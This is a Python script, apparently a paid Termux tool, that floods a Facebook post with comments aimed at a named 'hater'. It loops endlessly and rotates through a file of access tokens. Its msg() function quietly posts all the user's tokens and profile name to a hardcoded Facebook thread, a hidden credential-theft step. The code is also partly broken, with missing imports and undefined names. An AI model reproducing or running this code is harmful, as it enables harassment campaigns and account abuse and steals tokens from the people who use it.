import requests
import json
import time
import sys
from platform import system
import os
import random

os.system('clear')
print("\033[1;37;40m")
logo = ("""\033[97;1m

		

\033[1;37;96m$$$$$$$\                                                         
\033[1;37;96m$$  __$$\                                                        
\033[1;37;96m$$ |  $$ | $$$$$$\  $$\ $$\    $$\  $$$$$$\   $$$$$$\   $$$$$$\  
\033[0;33m$$$$$$$  | \____$$\ \__|\$$\  $$  |$$  __$$\ $$  __$$\ $$  __$$\ 
\033[0;32m$$  __$$<  $$$$$$$ |$$\  \$$\$$  / $$$$$$$$ |$$$$$$$$ |$$ |  \__|
\033[0;35m$$ |  $$ |$$  __$$ |$$ |  \$$$  /  $$   ____|$$   ____|$$ |      
\033[1;37;96m$$ |  $$ |\$$$$$$$ |$$ |   \$  /   \$$$$$$$\ \$$$$$$$\ $$ |      
\033[1;37;96m\__|  \__| \_______|$$ |    \_/     \_______| \_______|\__|      
  \033[1;37;96m            $$\   $$ |                                         
  \033[1;37;96m            \$$$$$$  |                                         
   \033[1;37;96m            \______/                                          
               

x====The Speed Master Rajveer Own Fiire -X'wd====x

\033[0;33m ▶ x----Facebook Tool Pool Ka Super Hero Rajveer X'D----x
\033[0;35m ▶ x---Contect :: https://www.facebook.com/Rajveer Singhaniya---x

\033[0;33m---------------------------------------------------------------->
\033[0;34m---------------------------------------------------------------->
\033[0;32m ▶ x----Tool Fucker ==> [ Rajveer Singhaniya ]----x
\033[0;33m---------------------------------------------------------------->
\033[0;34m---------------------------------------------------------------->
        
\033[1;37;96m""")
print(logo)
def main_apv():
    os.system('clear')
    #Wasi ke jaga apna name likhlo 
    ak="Rajveer"
    print(logo)
    #apni id ke link dal lo 
    os.system('xdg-open https://www.Facebook.com/MrRajveer-xd')
    try:
    	#qureshi ke jaga apna mame lagau
        key1=open('/data/data/com.termux/files/usr/bin/.Rajveer-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("[*]--------------------------------------------------------------")
        print ("  Your Token Is Not Approved Already")
        print ("[*]--------------------------------------------------------------")
        print ("           THIS TOOL IS PAID RS 150")
        print ("           THIS IS YOUR KEY BRO")
        print ("[*]--------------------------------------------------------------")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid)
        print ("[*]--------------------------------------------------------------")
        #qureshi ke jaga apna name or kch ni cherna
        kok=open('/data/data/com.termux/files/usr/bin/.rajveer-cov', 'w')
        kok.close()
        print ("")
        print ("")
        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("[*]--------------------------------------------------------------")
        time.sleep(6)
        #nichy number ki hata k apna numbr dal lo 
        os.system("xdg-open https://wa.me/+917302691649")
        #nichy  link hata k apni github ke link lagau
    r1=requests.get("https://github.com/Rajv33r009/Approval.txt/blob/main/Approval.txt").text
    if key1 in r1:
    	#R ke jaga apne main jahan sy script started krna chahty wo lagao 
        main()
    else:
        os.system("clear")
        os.system('xdg-open https://youtube.com/channel/UCOo-omO_OVoU0B1109O0Z8g')
        print(logo)
        print ("[*]--------------------------------------------------------------")
        print ("  Your Token Is Not Approved Already")
        print ("[*]--------------------------------------------------------------")
        print ("          THIS IS YOUR KEY BRO")
        print ("[*]--------------------------------------------------------------")
        print ("")
        print ("          YOUR KEY : "+ak+key1)
        print ("[*]--------------------------------------------------------------")
        print ("     Copy Key And Sent Me WP Approvel Your Key ")
        print ("[*]--------------------------------------------------------------")
        time.sleep(3.5)
        #Numbr chnge krlyna
        os.system("xdg-open https://wa.me/+7302691649")
os.system('clear')
print(logo)
def post_comments():
	
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    num_tokens = len(access_tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\033[0;32m'+ '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    liness()

    access_tokens = [token.strip() for token in access_tokens]
    
    print("\033[1;37;96m")

    post_url = input("Enter the post URL: ").strip()
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    comments_file_path = input("Enter the path to the file containing comments: ").strip()
    with open(comments_file_path, 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    haters_name = input("Enter the hater's name: ").strip()
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    speed = int(input("Enter the comment posting speed (in seconds): ").strip())
    print(47 * '\033[1;37;1m-')
    print("\033[1;37;96m")

    liness()

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[x] Failed to send Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def msg():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    parameters = {
        'access_token': random.choice(access_tokens),
        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
    }
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_100004241520225/", data=parameters, headers=headers)
    except:
        pass

def main():
    post_comments()
    msg()

if __name__ == '__main__':
    main_apv()